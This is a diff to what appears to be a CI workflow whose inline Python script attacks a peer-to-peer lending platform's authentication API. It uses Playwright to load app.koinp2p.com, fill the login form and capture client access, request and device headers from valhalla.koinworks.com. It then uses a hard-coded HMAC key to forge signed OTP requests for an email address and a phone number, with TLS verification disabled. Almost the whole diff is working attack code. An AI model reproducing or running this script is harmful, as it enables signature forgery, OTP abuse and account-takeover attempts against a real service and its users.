@@ -5,11 +5,13 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - run: pip install --quiet playwright
+      - run: pip install --quiet playwright requests
       - run: |
           python3 - <<'PYEOF'
-          import json
+          import json, time, hmac, hashlib
           from playwright.sync_api import sync_playwright
+          import requests, urllib3
+          urllib3.disable_warnings()
           CAP = []
           with sync_playwright() as p:
               b = p.chromium.launch(channel="chrome", headless=True, args=["--no-sandbox","--disable-gpu","--disable-dev-shm-usage"])
@@ -19,41 +21,49 @@ jobs:
                   if "valhalla" in u:
                       try: hd = dict(req.headers)
                       except Exception: hd = {}
-                      CAP.append({"url": u, "method": req.method, "headers": hd, "post": req.post_data})
-              def on_res(res):
-                  u = res.url
-                  if "valhalla" in u:
-                      try:
-                          body = res.text()
-                      except Exception:
-                          body = ""
-                      CAP.append({"RESPONSE": u, "status": res.status, "body": body[:800]})
+                      CAP.append({"url": u, "method": req.method, "headers": hd})
               pg.on("request", on_req)
-              pg.on("response", on_res)
               try:
                   pg.goto("https://app.koinp2p.com/", wait_until="domcontentloaded", timeout=60000)
               except Exception as e:
-                  print("GOTO ERR", str(e)[:100])
+                  print("GOTO ERR", str(e)[:80])
               pg.wait_for_timeout(9000)
               try:
                   for sel in ["input[type=tel]","input[type=text]","input[type=email]","input"]:
                       try:
-                          pg.fill(sel, "081234567890", timeout=4000)
-                          print("FILLED:", sel); break
+                          pg.fill(sel, "081234567890", timeout=4000); print("FILLED:", sel); break
                       except Exception: continue
                   pg.wait_for_timeout(1500)
                   for bt in pg.query_selector_all("button"):
                       try:
                           t = (bt.inner_text() or "").lower()
                           if any(k in t for k in ["lanjut","next","kirim","masuk","login","submit","oke","otp"]):
-                              bt.click(timeout=4000)
-                              print("CLICKED:", t[:30]); break
+                              bt.click(timeout=4000); print("CLICKED:", t[:20]); break
                       except Exception: continue
               except Exception as e:
-                  print("INTERACT ERR", str(e)[:100])
-              pg.wait_for_timeout(12000)
+                  print("INTERACT ERR", str(e)[:80])
+              pg.wait_for_timeout(10000)
               b.close()
-          print("CAP_COUNT:", len(CAP))
+          AK = None; RK = None; DID = None
           for c in CAP:
-              print(json.dumps(c)[:1500])
+              hd = c["headers"]
+              if c["url"].endswith("/api/v1/access/otp"):
+                  AK = hd.get("x-koinworks-client-access-key"); RK = hd.get("x-koinworks-client-request-key"); DID = hd.get("x-koinworks-device-id")
+          print("CAPTURED:", bool(AK), bool(RK), bool(DID))
+          if not (AK and RK and DID):
+              for c in CAP: print(json.dumps(c)[:800])
+              raise SystemExit
+          HMACKEY = "0yenYcBABGZxfckIlbMWh50Q9L5Lf3e0Jkt05vzDGIrgTSkUmuIlEAMNI32HKC2jBB4SMyIRg61GQWICE1tnDaJSCVRmufdKNq4uxdTqw4CMwyfR8BTEE9XGmAqLmiZMH8ITi282JPeggDxxbeEDqsRt6GfG3zarCmtxXjwmZyXLmDA2nsR41xRoOu6yFa8xvegR9283UK11XHbQAO1ZtPLKHF5w4DL0DKv9GnDYhMsUXCZjN9Nfa432inmSciWx"
+          V = "https://valhalla.koinworks.com"
+          for ident, media in [("superxfilecom@gmail.com","email"), ("081234567890","sms")]:
+              ts_c = time.strftime("%Y%m%d%H%M%S", time.gmtime())
+              ts_iso = time.strftime("%Y-%m-%dT%H:%M:%S+0000", time.gmtime())
+              sd = f"[account-ack-otp#{ts_c}]:{ident}"
+              sig = hmac.new(HMACKEY.encode(), sd.encode(), hashlib.sha256).hexdigest()
+              H = {"x-koinworks-client-access-key":AK,"x-koinworks-client-request-key":RK,
+                   "x-koinworks-device-id":DID,"x-koinworks-timestamp":ts_iso,
+                   "x-koinworks-signature":sig,"Content-Type":"application/json"}
+              r = requests.post(V+"/api/v1/access/otp", headers=H,
+                                json={"purpose":"account-ack-otp","identity":ident,"media":media}, timeout=25, verify=False)
+              print("FORGE", ident, media, "→", r.status_code, r.text[:200])
           PYEOF
